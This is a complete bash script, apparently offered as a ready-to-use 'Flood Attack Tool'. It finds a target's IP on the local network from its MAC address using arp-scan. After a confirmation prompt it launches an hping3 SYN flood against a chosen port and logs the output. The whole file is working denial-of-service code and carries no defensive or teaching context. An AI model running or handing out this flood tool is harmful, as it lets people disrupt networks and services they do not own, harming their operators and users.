#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Log file
LOG_FILE="attack_log.txt"

# Function to validate MAC address
validate_mac() {
    local mac="$1"
    if [[ "$mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        return 0
    else
        return 1
    fi
}

# Function to validate IP address
validate_ip() {
    local ip="$1"
    if [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        return 0
    else
        return 1
    fi
}

# Function to detect the local interface
detect_interface() {
    local interface
    interface=$(ip route | grep default | awk '{print $5}' 2>/dev/null)
    if [ -z "$interface" ]; then
        echo "No active interface detected. Please enter manually."
        return 1
    else
        echo "$interface"
        return 0
    fi
}

# Function to resolve IP from MAC using ARP
resolve_ip() {
    local mac="$1"
    local interface="$2"
    echo -e "${BLUE}[*] Scanning network for MAC: $mac on interface $interface...${NC}" | tee -a "$LOG_FILE"
    local ip
    ip=$(sudo arp-scan --interface="$interface" --localnet | grep -i "$mac" | awk '{print $1}' 2>/dev/null)
    if [ -n "$ip" ]; then
        echo -e "${GREEN}[+] Found IP: $ip for MAC: $mac${NC}" | tee -a "$LOG_FILE"
        echo "$ip"
        return 0
    else
        echo -e "${RED}[-] No IP found for MAC: $mac${NC}" | tee -a "$LOG_FILE"
        return 1
    fi
}

# Function to perform flood attack
flood_attack() {
    local ip="$1"
    local port="$2"
    echo -e "${YELLOW}[*] Starting flood attack on $ip...${NC}" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}Press Ctrl+C to stop the attack.${NC}"
    sudo hping3 --flood -d 120 -S -p "$port" "$ip" 2>&1 | tee -a "$LOG_FILE"
}

# Main script
echo -e "${BLUE}[*] Starting MAC to IP Resolver and Flood Attack Tool${NC}" | tee -a "$LOG_FILE"

# Detect or prompt for interface
INTERFACE=$(detect_interface)
if [ $? -ne 0 ]; then
    read -p "Enter the network interface (e.g., eth0, wlan0): " INTERFACE
fi

# Prompt for MAC address
read -p "Enter the target MAC address (format: XX:XX:XX:XX:XX:XX): " MAC
while ! validate_mac "$MAC"; do
    echo -e "${RED}[-] Invalid MAC address format. Please try again.${NC}"
    read -p "Enter the target MAC address (format: XX:XX:XX:XX:XX:XX): " MAC
done

# Try to resolve IP from MAC
IP=$(resolve_ip "$MAC" "$INTERFACE")
if [ $? -ne 0 ]; then
    read -p "Enter the target IP address manually: " IP
    while ! validate_ip "$IP"; do
        echo -e "${RED}[-] Invalid IP address format. Please try again.${NC}"
        read -p "Enter the target IP address manually: " IP
    done
fi

# Prompt for port (optional)
read -p "Enter the target port (default: 80): " PORT
PORT=${PORT:-80}

# Confirm attack
echo -e "${YELLOW}[!] Target IP: $IP, Port: $PORT${NC}"
read -p "Are you sure you want to proceed with the flood attack? (y/n): " CONFIRM
if [[ "$CONFIRM" =~ ^[Yy]$ ]]; then
    flood_attack "$IP" "$PORT"
else
    echo -e "${RED}[-] Attack aborted.${NC}" | tee -a "$LOG_FILE"
    exit 1
fi

echo -e "${GREEN}[+] Script completed. Log saved to $LOG_FILE${NC}"
